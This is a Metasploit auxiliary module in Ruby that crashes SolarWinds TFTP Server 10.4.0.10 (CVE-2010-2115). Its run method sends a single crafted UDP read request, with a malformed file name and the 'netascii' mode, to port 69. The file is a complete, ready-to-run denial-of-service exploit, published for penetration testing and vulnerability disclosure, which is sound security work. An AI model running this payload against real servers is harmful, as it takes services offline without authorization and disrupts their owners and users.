##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SolarWinds TFTP Server 10.4.0.10 Denial of Service' ,
      'Description'    => %q{
          The SolarWinds TFTP server can be shut down by sending a 'netascii' read
        request with a specially crafted file name.
      },
      'Author'         => 'Nullthreat',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-2115' ],
          [ 'OSVDB', '64845' ],
          [ 'EDB', '12683' ]
        ],
      'DisclosureDate' => 'May 21 2010'))

    register_options([
      Opt::RPORT(69)
    ])
  end

  def run
    connect_udp
    print_status("Sending Crash request...")
    udp_sock.put("\x00\x01\x01\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00")
    disconnect_udp
  end
end
